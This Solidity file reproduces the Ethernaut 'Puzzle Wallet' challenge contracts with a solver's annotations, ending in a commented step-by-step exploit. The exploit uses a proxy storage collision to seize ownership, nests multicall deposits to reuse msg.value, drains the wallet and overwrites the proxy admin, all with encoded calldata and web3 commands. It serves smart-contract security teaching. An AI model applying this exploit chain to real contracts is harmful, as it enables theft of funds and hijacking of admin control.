// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Puzzle Wallet  
/// @author OpenZeppelin
/// @notice - Objective, take over proxy contract, PuzzleProxy by becoming admin
///         - Vulnerabiliry is due to storage collision from the use of delegatecall
///         - Proxy contracts mechanism, proxy contracts(data), logic contract(logic)
///         - Proxy = puzzle proxy, upgradeable contract(logic) = puzzle wallet
///         - storage slots and memory slot collision
///         - delegatecall
///         - initData = when you used delegatecall, data is passed from logic to proxy contract and the data is funneled through the init data
///         - init data is used for delegate call data passed from proxy contract eg. slot 0 and slot 1
///         Lesson, 
///         - using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost
///         - must be careful not to introduce storage collisions
///         - iterating over operations that consume ETH can lead to issues if it is not handled correctly
///         - Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration
///         - can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/// proxy contract
contract PuzzleProxy is ERC1967Proxy {
    address public pendingAdmin; // slot 0
    address public admin; // slot 1

    constructor(address _admin, address _implementation, bytes memory _initData) ERC1967Proxy(_implementation, _initData){
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    /// no modifier here
    function proposeNewAdmin(address _newAdmin) external { 
        pendingAdmin = _newAdmin;
    }

    /// can only be accessed by the admin
    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    /// can only be accessed by the admin
    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

/// logic contract, this is where everything happens
contract PuzzleWallet {
    using SafeMath for uint256; 
    address public owner; // slot 0 - pending admin ^
    uint256 public maxBalance; // slot 1 - admin ^
    mapping(address => bool) public whitelisted; // slot 2 and more
    mapping(address => uint256) public balances; // slot 3 and more

    /// proxy contract version of a connstructor, used to initiate a logical contrat thats connected to a proxy contract
    /// GOAL if we can set the max balance, then we can become the admin in the proxy
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }


    /// GOAL if we can set the max balance, then we can become the admin in the proxy
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    /// can add to the whitelist because we are the owner according to the proxy contract at slot 0
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    /// requires to be whitelisted
    /// deposits into the the balances with the same msg.value, so repetition
    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    /// used to siphon the funds and set balance to 0
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    /// batch multi trx to save on gas
    /// cannot run deposit multiple times because of the selector check
    /// what we can do is call multicall again, that calls the deposit seperately each time
    /// with this, we only send msg.value once, while adding the amount to our balances mapping
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

/// Steps for attack

/// - Storage layout is wrong
/// - Exploit pending admin slot
/// - functionAdmin = {
///     name: 'proposeNewAdmin',
///     types: 'function',
///     inputs: [{
///       type: 'address',  
///       name: '_newAdmin'
///       }]
///    }
/// this is to call the proxy contract method
/// - params = [player]
/// - data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
/// - encodes the function data to be sent as a transaction
/// - data output = 0xa6376746000000000000000000000000a5fd3b0f21bf8d6e0eb580b65c7feccda2dcd638
/// - calls the function, and sets the player as the new admin, with use of the data encoded, the abi doesnt expose these functions from the proxy contracts so a low level transaction needs to be called
/// - await web3.eth.sendTransaction({from: player, to: instance, data})
/// - to verify we can check by running await contract.owner() === player
/// - the Output should be: true
/// - since we're now the owner we can add ourselves to the whitelist using the logic contracts functions, the function can be called like this since it is exposed as the logic contract
/// - await contract.addToWhitelist(player)
/// - since the contract balance isnt 0, we will have to drain the contract before we proceed
/// - to do so, we will take advantage of the multicall function
/// - what we're gonna do is create multicalls within multicalls that has a deposit method within them
/// - to do this, firstly we will
/// - create the deposit method data
/// - depositData = await contract.methods["deposit()"].request().then(v => v.data)
/// - which will output as this '0xd0e30db0'
/// - then we will get the multicall method data, which has a deposit method within it like so, 
/// - multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)
/// - this looks like so 
/// - '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
/// - once we have the multicalldata with the deposit data within, we can call the multicall function with the data twice
/// - await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
/// - with this, we now have a higher balance and can perform the execute function to drain the contract
/// - await contract.execute(player, toWei('0.002'), 0x0)
/// - we will then validate to make sure that the contract no longer has any balance
/// - await getBalance(contract.address)
/// - once we have verified that it is 0
/// - we can take advantage of the setMaxBAlance function and set ourselfs as the owner of the proxy
/// - await contract.setMaxBalance(player)
/// 